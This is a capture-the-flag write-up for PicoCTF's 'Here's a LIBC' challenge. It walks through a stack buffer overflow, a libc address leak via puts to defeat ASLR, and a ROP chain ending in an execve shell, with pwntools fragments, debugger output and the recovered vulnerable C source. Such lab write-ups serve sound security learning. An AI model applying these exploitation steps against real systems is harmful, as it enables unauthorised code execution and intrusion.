# PicoCTF: Here's a LIBC

## TL;DR:

The flag value resides in a file in the target process's current working
directory. The objective is to gain arbitrary code execution of the target
process in order to read the contents of the flag file.

The program reads attacker controlled input from stdin into into a fixed size
`char []` buffer allocatd on the stack, thus giving the attacker the ability to
overflow the buffer and overwrite the calling function's saved return address.

Techniques
- Binary reverse engineering
- Stack buffer overflow to overwrite return address
- ROP

Mitigations
- Stack canaries are disabled.
- ASLR is disabled for the main binary and enabled for shared libraries. An ASLR
  defeat is required to locate the libc base address.

## Preparations

`pwninit` was again helpful to fetch the necessary linker/loader and generate a
patched binary, `vuln_patched`.

Investigate the binary using Ghidra to see what we're working with.

## Getting control of $rip

The `do_stuff()` function creates a stack buffer of 112 bytes, and later uses
`scanf()` to read user input into the buffer. The user is free to send an
arbitrarily long input string, thereby allowing the user to overflow the stack
buffer and overwrite the contents of the stack including the saved instruction
pointer.

Now we figure out how much junk data we need to send prior to overwriting the
saved return address:

In `solve.py`:
```py
r.sendline(cyclic(150))
```

Then in pwntools:
```the
pwndbg> c                                                                                                                                                                                                                      [25/90]
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400770 in do_stuff ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────
*RAX  0x7a
 RBX  0x0
*RCX  0x7f4db9b2d264 (write+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x7f4db9e0a8c0 (_IO_stdfile_1_lock) ◂— 0x0
*RDI  0x1
*RSI  0x7f4db9e097e3 (_IO_2_1_stdout_+131) ◂— 0xe0a8c0000000000a /* '\n' */
*R8   0x79
 R9   0x0
 R10  0x0
*R11  0x246
 R12  0x1b
 R13  0x0
 R14  0x1b
 R15  0x0
*RBP  0x6261616962616168 ('haabiaab')
*RSP  0x7ffda6edea28 ◂— 'jaabkaablaabma'
*RIP  0x400770 (do_stuff+152) ◂— ret
```

It's failing to pop the saved return address from the stack $rsp (because it's
an illegal address, as expected since it's been corrupted with cyclic input),
and we can see its current value is `jaabkaablaabma`.

So now to the shell:

```sh
kavefish@cairn:heres_a_libc/ $ cyclic -l jaab
136
```

So we need to send 136 garbage bytes first, then the next 8 bytes we send will
overwrite the saved return address.

## Picking an exploitation approach: Ret2LibC

Alas the target binary has NX enabled, so the stack isn't executable and thus we
have to ROP to control execution flow:

```
'/heres_a_libc/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

Also, the challenge's name is a big hint that Ret2LibC is the intended approach.
;)

The simplest Ret2LibC attack invokes the `system()` function to run `/bin/sh`.
Let's start there.

pwntools will happily tell us the offset of `system()` into the libc binary:

```py
from pwn import *
libc = ELF("./libc.so.6")
In [11]: hex(libc.symbols['system'])
Out[11]: '0x4f4e0'
```

However, that's not an absolute address; it doesn't fall within any of the
allocated regions as shown by `vmmap`. Even if it were the absolute address of
`system()`, our libc is a position independent executable, so its address could
be randomized each time the process starts.

## Find the absolute address of `system()`

The echo server's `do_stuff()` function runs in a `while(true)` loop, which
means we can potentially interact with the target process multiple times: first
a leak to help us resolve the absolute address of `system()` and then an
overwrite of the saved instruction pointer with a ROP chain.

If we're careful to make sure there are no nulls (i.e. 0s) in our input to the
target process, then we can potentially leak from the stack when `puts()` prints
our input back to us. Let's see if there are any interesting values in there
that might be helpful.

```gdb
pwndbg> x/16gx $rbp-0x30
0x7fff363db970: 0x00007fff363db9b0    > 0x00007f036a035bd2 <
0x7fff363db980: 0x00007f036a39d2a0      0x0000000000000000
0x7fff363db990: 0x0000000000000000      0x000000000000001b
0x7fff363db9a0: 0x00007fff363dba50      0x00000000004008a0
0x7fff363db9b0: 0x20456d4f634c6557      0x634520596d206f54
0x7fff363db9c0: 0x6556724573206f48      0x0000000000002152
0x7fff363db9d0: 0x00007fff363dbb38      0x0000000100000000
0x7fff363db9e0: 0x20656d6f636c6557      0x636520796d206f74
```

Let's check `vmmap` to see where these values might reside, which should help us
narrow down options for invesigation.

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/vuln_patched
          0x600000           0x601000 r--p     1000 0      /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/vuln_patched
          0x601000           0x602000 rw-p     1000 1000   /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/vuln_patched
         0x1c56000          0x1c77000 rw-p    21000 0      [heap]
    0x7f0369fb5000     0x7f036a19c000 r-xp   1e7000 0      /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/libc.so.6
    0x7f036a19c000     0x7f036a39c000 ---p   200000 1e7000 /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/libc.so.6
    0x7f036a39c000     0x7f036a3a0000 r--p     4000 1e7000 /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/libc.so.6
    0x7f036a3a0000     0x7f036a3a2000 rw-p     2000 1eb000 /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/libc.so.6
    0x7f036a3a2000     0x7f036a3a6000 rw-p     4000 0      [anon_7f036a3a2]
    0x7f036a3a6000     0x7f036a3cd000 r-xp    27000 0      /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/ld-2.27.so
    0x7f036a5cb000     0x7f036a5cd000 rw-p     2000 0      [anon_7f036a5cb]
    0x7f036a5cd000     0x7f036a5ce000 r--p     1000 27000  /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/ld-2.27.so
    0x7f036a5ce000     0x7f036a5cf000 rw-p     1000 28000  /home/kavefish/Documents/devel/ctf/picoctf/practice/heres_a_libc/ld-2.27.sothe
    0x7f036a5cf000     0x7f036a5d0000 rw-p     1000 0      [anon_7f036a5cf]
    0x7fff363bd000     0x7fff363de000 rw-p    21000 0      [stack]
    0x7fff363f1000     0x7fff363f5000 r--p     4000 0      [vvar]
    0x7fff363f5000     0x7fff363f7000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

`0x00007f036a035bd2` resides in the range `0x7f0369fb5000-0x7f036a19c000`, which
corresponds to libc's text section.

Let's see if pwndbg can tell us which function this is:

```
pwndbg> x/10i 0x00007f036a035bd2
   0x7f036a035bd2 <_IO_puts+418>:       cmp    eax,0xffffffff
   0x7f036a035bd5 <_IO_puts+421>:       jne    0x7f036a035b28 <_IO_puts+248>                                                                                                                                                          ───────
   0x7f036a035bdb <_IO_puts+427>:       jmp    0x7f036a035ba1 <_IO_puts+369>
   0x7f036a035bdd <_IO_puts+429>:       test   DWORD PTR [rbp+0x0],0x8000
   0x7f036a035be4 <_IO_puts+436>:       mov    rsi,rax
   0x7f036a035be7 <_IO_puts+439>:       jne    0x7f036a035c28 <_IO_puts+504>
   0x7f036a035be9 <_IO_puts+441>:       mov    rdx,QWORD PTR [rbp+0x88]
   0x7f036a035bf0 <_IO_puts+448>:       sub    DWORD PTR [rdx+0x4],0x1
   0x7f036a035bf4 <_IO_puts+452>:       jne    0x7f036a035c28 <_IO_puts+504>
   0x7f036a035bf6 <_IO_puts+454>:       mov    QWORD PTR [rdx+0x8],0x0
```

Looks like this address is 418 bytes into the `puts()` function within libc.
Let's double check the math:

```
pwndbg> x/10i 0x00007f036a035bd2-418
   0x7f036a035a30 <_IO_puts>:   push   r13
   0x7f036a035a32 <_IO_puts+2>: push   r12
   0x7f036a035a34 <_IO_puts+4>: mov    r12,rdi
   0x7f036a035a37 <_IO_puts+7>: push   rbp
   0x7f036a035a38 <_IO_puts+8>: push   rbx
   0x7f036a035a39 <_IO_puts+9>: sub    rsp,0x8
   0x7f036a035a3d <_IO_puts+13>:        call   0x7f0369fd6100 <*ABS*+0x9dce0@plt>
   0x7f036a035a42 <_IO_puts+18>:        mov    rbp,QWORD PTR [rip+0x36bdff]        # 0x7f036a3a1848
   0x7f036a035a49 <_IO_puts+25>:        mov    rbx,rax
   0x7f036a035a4c <_IO_puts+28>:        mov    eax,DWORD PTR [rbp+0x0]
```

Yep, all that stack manipulation looks like a function preamble, so that passes
the sanity check.

Even though the absolute address of libc will vary each time the process loads,
the contents of the libc library will remain consistent. This means we can
compute the absolute address of `system()` by first using pwntools to measure
how far apart `puts()` and `system()` are within the libc binary, and then add
or subtract that number of bytes from the leaked address corresponding to
`puts()` + 418.

```py
from pwn import *
libc = ELF("./libc.so.6")
In [25]: libc.symbols['puts'] + 418 - libc.symbols['system']
Out[25]: 202482
```

It turns out pwntools includes convenience data structures for this purpose and
for improved reliability / portability:

```py
from pwn import *
libc = ELF("./libc.so.6")
libc_puts_addr = ... # parse leaked data to reconstruct address
libc_base_addr = libc_puts_addr - libc.symbols['puts']
libc_system_addr = libc_base_addr + libc.symbols['system']
```

## Pop a Shell

### Struggle for days

After finding the absolute address of `system()` I really struggled with
crashing the target process on the second stack smash.

Originally I was trying (and succeeding) to return execution to `main()` just
after the call to `do_stuff()`, as a normal `return` would do. My thinking was
that the stack would be in a relatively healthier state since I had to trigger a
`LEAVE` and `RET` for ROP, so the call from `main()` back into `do_stuff()`
should've more or less reset the stack pointer to roughly the same place.
Unfortunately that approach led to crashes as `puts()` made deeper calls that
somehow relied on dereferencing data that was corrupted at that point. Then I
tried returning to the very beginning of `do_stuff()`, but that had the same
problem.

After spending a day or so troubleshooting the stack layout and then failing to
troubleshoot exactly where the stack data was getting corrupted, I tried using
the very beginning of `main()` as the saved return address, which effectively
restarts the program anew after every ROP chain. That avoided the crash and
since the program is tiny and didn't require keeping any state, this was
perfectly fine.

### Fail to use `system('/bin/sh'))`

I set up the second ROP chain to invoke `system('/bin/sh')`. The `gdb` trace
indicating a subprocess was spawned, so the shell process was almost certainly
started successfully. However, the child process crashed immediatley after
launch on invalid data references for reasons I don't fully understand.
Furthermore, there wasn't an obvious way to wire up the child process's
stdin/stdout to my existing TCP session.

So rather than going through the effort of redirecting stdin/stdout and then
troubleshooting whatever was killing the shell process (preventing child
processes could've been a security feature of the challenge for which there
might not have been a bypass), I opted to try pwntool's baked in ROP chain
generation to invoke the `execve()` system call directly. That would hollow out
the existing binary, replace it with the `/bin/sh` executable image *and* retain
stdin/stdout connectivity with my established TCP session.

This led to a shell wherein a file named `flag.txt` was conveniently located in
my current directory.

Fin.

## References

### Linkers & Loaders

https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html

https://www.airs.com/blog/archives/38  (http://a3f.at/lists/linkers)

https://www.iecc.com/linker/

## Appendix: Recovered source code
The following directory contents are visible upon popping a shell:

```sh
$ ls -l
total 2008
-r--r----- 1 hacksports here-s-a-libc_0      45 Mar 16  2021 flag.txt
-rw-rw-r-- 1 hacksports hacksports      2030544 Mar 15  2021 libc.so.6
-rwxr-sr-x 1 hacksports here-s-a-libc_0    8560 Mar 16  2021 vuln
-rw-rw-r-- 1 hacksports hacksports          975 Mar 16  2021 vuln.c
-rwxr-sr-x 1 hacksports here-s-a-libc_0     116 Mar 16  2021 xinet_startup.sh
```

```c
$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


char convert_case(char c, size_t i) {
    if ((c >= 'a') && (c <= 'z')) {
        if (i % 2) {
            return c;
        } else {
            return c - 32;
        }
    } else if ((c >= 'A') && (c <= 'Z')) {
        if (i % 2) {
            return c + 32;
        } else {
            return c;
        }
    } else {
        return c;
    }
}

void do_stuff() {
    char buf[100];
    size_t length = 0;
    char nl;

    scanf("%[^\n]", buf);
    scanf("%c", &nl);
    for (size_t i = 0; i < 100; i++) {
        buf[i] = convert_case(buf[i], i);
    }
    printf("%s\n", buf);
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    // Set the gid to the effective gid
    // this prevents /bin/sh from dropping the privileges
    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    size_t welcome_len = 27;
    char welcome[] = "Welcome to my echo server!";
    char pwelcome[welcome_len];
    for (size_t i = 0; i < welcome_len; i++) {
        pwelcome[i] = convert_case(welcome[i], i);
    }
    puts(pwelcome);

    while (1) {
        do_stuff();
    }
}
```

```sh
$ cat xinet_startup.sh
#!/bin/bash
cd $(dirname $0)
exec timeout -sKILL 3m /problems/here-s-a-libc_0_3d12d7581a40937c1aafdc32ed0762e8/vuln
```